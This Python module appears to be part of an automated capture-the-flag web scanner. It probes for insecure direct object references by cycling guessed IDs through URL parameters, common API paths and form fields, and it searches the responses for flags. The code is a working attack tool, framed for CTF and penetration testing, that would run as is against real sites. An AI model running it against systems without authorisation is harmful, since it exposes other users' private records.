"""
IDOR Module v2 — Insecure Direct Object Reference
Aggressively tests object IDs to find flag-containing resources.
"""
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from backend.core.base_module import BaseModule
from backend.core.flag_hunter import FlagHunter
from backend.core.parser import Parser


class IDORModule(BaseModule):
    MODULE_NAME = "idor"
    DESCRIPTION = "IDOR — Object ID brute-force for flag exposure"

    # IDs to probe (common CTF patterns: admin=0/1, flag at id=1337, etc.)
    TEST_IDS = [
        "0", "1", "2", "3", "4", "5", "10", "100",
        "1337", "9999", "99999", "-1", "admin", "flag",
        "secret", "root", "administrator", "superuser",
        "00000000-0000-0000-0000-000000000001",   # UUID v4 pattern
        "ffffffff-ffff-ffff-ffff-ffffffffffff",
        "0x1", "0x41", "0xdeadbeef",
    ]

    # Endpoints that commonly expose flags via IDOR in CTFs
    IDOR_PATHS = [
        "/api/user/{id}",
        "/api/users/{id}",
        "/api/flag/{id}",
        "/api/flags/{id}",
        "/api/note/{id}",
        "/api/notes/{id}",
        "/api/post/{id}",
        "/api/posts/{id}",
        "/user/{id}",
        "/users/{id}",
        "/profile/{id}",
        "/account/{id}",
        "/admin/{id}",
        "/file/{id}",
        "/download/{id}",
        "/view/{id}",
        "/read/{id}",
        "/message/{id}",
        "/ticket/{id}",
    ]

    def run(self) -> dict:
        self.log(f"[IDOR] Starting scan on {self.target_url}")
        resp = self.requester.get()
        if resp is None:
            self.results["status"] = "unreachable"
            return self.results

        for f in FlagHunter.hunt(resp.text):
            self.add_flag(f)

        # Test URL params that look like IDs
        self._test_url_id_params()

        # Test common IDOR path patterns
        self._test_idor_paths()

        # Test forms with numeric/ID fields
        forms = Parser.extract_forms(resp.text)
        for form in forms:
            self._test_form_idor(form)

        if self.results["status"] == "pending":
            self.results["status"] = "not_vulnerable"
        return self.results

    def _test_url_id_params(self):
        parsed = urlparse(self.target_url)
        params = parse_qs(parsed.query)
        id_params = {k: v for k, v in params.items()
                     if any(kw in k.lower() for kw in
                            ("id", "uid", "user", "account", "profile",
                             "note", "post", "file", "doc", "ticket",
                             "order", "item", "record", "object", "ref"))}
        for param in id_params:
            self.log(f"[IDOR] Testing ID param: {param}")
            orig_val = id_params[param][0] if id_params[param] else "1"
            for test_id in self.TEST_IDS:
                test = {**params, param: test_id}
                url  = urlunparse(parsed._replace(query=urlencode(test, doseq=True)))
                r = self.requester.raw_get(url)
                if r is None or r.status_code == 404:
                    continue
                flags = FlagHunter.hunt(r.text)
                if flags:
                    [self.add_flag(f) for f in flags]
                    self.add_vuln({"type": "idor_flag", "param": param,
                                   "id": test_id, "flags": flags})
                    self.log(f"[IDOR] FLAG at {param}={test_id}!")
                    return
                # Check if we got a different/more privileged response
                if r.status_code == 200 and len(r.text) > 50:
                    self.log(f"[IDOR] Accessible: {param}={test_id} [{r.status_code}]")

    def _test_idor_paths(self):
        parsed = urlparse(self.target_url)
        base   = f"{parsed.scheme}://{parsed.netloc}"
        for path_tmpl in self.IDOR_PATHS:
            for test_id in self.TEST_IDS[:12]:
                url = base + path_tmpl.replace("{id}", test_id)
                r = self.requester.raw_get(url)
                if r is None or r.status_code in (404, 405):
                    continue
                flags = FlagHunter.hunt(r.text)
                if flags:
                    [self.add_flag(f) for f in flags]
                    self.add_vuln({"type": "idor_path_flag",
                                   "url": url, "flags": flags})
                    self.log(f"[IDOR] FLAG at {url}!")
                    return
                if r.status_code == 200:
                    self.log(f"[IDOR] Accessible: {url}")

    def _test_form_idor(self, form):
        action = form["action"] or self.target_url
        if not action.startswith("http"):
            action = self.target_url.rstrip("/") + "/" + action.lstrip("/")
        for field in form["inputs"]:
            if not field["name"]:
                continue
            name = field["name"].lower()
            if not any(kw in name for kw in ("id", "uid", "user_id", "post_id",
                                              "note_id", "file_id", "ref")):
                continue
            for test_id in self.TEST_IDS[:8]:
                data = {i["name"]: (test_id if i["name"] == field["name"]
                                    else i["value"] or "test")
                        for i in form["inputs"] if i["name"]}
                r = (self.requester.post(action, data=data)
                     if form["method"] == "POST"
                     else self.requester.get(action, params=data))
                if r is None:
                    continue
                flags = FlagHunter.hunt(r.text)
                if flags:
                    [self.add_flag(f) for f in flags]
                    self.add_vuln({"type": "idor_form",
                                   "field": field["name"], "id": test_id})
                    self.log(f"[IDOR] FLAG via form field '{field['name']}'={test_id}!")
                    return
